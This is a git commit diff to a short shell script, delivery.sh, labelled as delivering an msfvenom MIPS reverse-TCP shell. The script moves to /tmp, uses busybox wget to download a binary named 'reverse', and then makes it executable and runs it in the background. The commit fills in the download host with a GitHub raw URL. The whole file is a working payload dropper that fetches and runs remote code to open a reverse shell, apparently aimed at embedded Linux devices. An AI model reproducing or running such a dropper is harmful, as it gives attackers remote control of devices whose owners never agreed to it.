a44dc79a860667eae2c229da42c4543150f7b5f7
howpwn <finn79426@gmail.com>
2020-04-17 18:43:58 +0800

    Update delivery.sh

--- delivery.sh
+++ delivery.sh
@@ -1,5 +1,5 @@
 # (msfvenom) linux/mipsbe/shell/reverse_tcp
 cd /tmp/
-busybox wget -O reverse http:///reverse
+busybox wget -O reverse https://github.com/finn79426/test/raw/master/reverse
 busybox chmod +x reverse
 ./reverse &
